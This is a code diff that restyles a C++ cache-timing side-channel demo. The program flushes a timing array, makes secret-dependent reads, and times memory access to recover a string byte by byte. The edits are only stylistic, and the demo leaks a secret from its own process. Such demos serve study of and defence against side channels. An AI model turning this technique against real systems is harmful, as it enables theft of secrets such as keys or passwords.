@@ -27,7 +27,7 @@ static int64_t read_tsc() {
 template <typename RangeT>
 static std::pair<int, int> top_two_indices(const RangeT &range) {
     int j{0}, k{0};
-    for(int i = 0; i < range.size(); i++) {
+    for(int i{0}; i < range.size(); i++) {
         if(range[i] > range[j]) {
             k = j;
             j = i;
@@ -54,30 +54,30 @@ char leak_byte(std::string_view text, int idx) {
     std::array<int, 256> scores{};
     int best_val{0}, runner_up_val{0};
 
-    for(int run = 0; run < 1000; run++) {
+    for(int run{0}; run < 1000; run++) {
         // flush all of timing array
-        for(int i = 0; i < 256; i++) {
+        for(int i{0}; i < 256; i++) {
             _mm_clflush(&timing_array[i * 512]);
         }
 
         // perform reads that are data-dependent on the secret
         // as a program being attacked might
-        for(int i = 0; i < 100; i++) {
+        for(int i{0}; i < 100; i++) {
             force_read(&timing_array[data[idx] * 512]);
         }
 
         // now measure read latencies to see if we can detect what data[idx] was
-        for(int i = 0; i < 256; i++) {
-            int mixed_i = ((i * 167) + 13) & 0xff; // ???, I guess so we test in pseudo-random order?
-            uint8_t *timing_entry = &timing_array[mixed_i * 512];
-            int64_t start = read_tsc();
+        for(int i{0}; i < 256; i++) {
+            int mixed_i{((i * 167) + 13) & 0xff}; // ???, I guess so we test in pseudo-random order?
+            uint8_t *timing_entry{&timing_array[mixed_i * 512]};
+            int64_t start{read_tsc()};
             force_read(timing_entry);
             latencies[mixed_i] = read_tsc() - start;
         }
 
         // score anything that stands out
-        int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
-        for(int i = 0; i < 256; i++) {
+        int64_t avg_latency{std::accumulate(latencies.begin(), latencies.end(), 0) / 256};
+        for(int i{0}; i < 256; i++) {
             if(latencies[i] < (avg_latency * 3 / 4)) {
                 scores[i]++;
             }
@@ -94,8 +94,8 @@ char leak_byte(std::string_view text, int idx) {
 }
 
 int main(int argc, char **argv) {
-    for(int i = 0; i < sekret.size(); i++) {
-        char ch = leak_byte(sekret, i);
+    for(long i{0}; i < sekret.size(); i++) {
+        char ch{leak_byte(sekret, i)};
         std::cout << "got: " << ch << std::endl;
     }
     return 0;
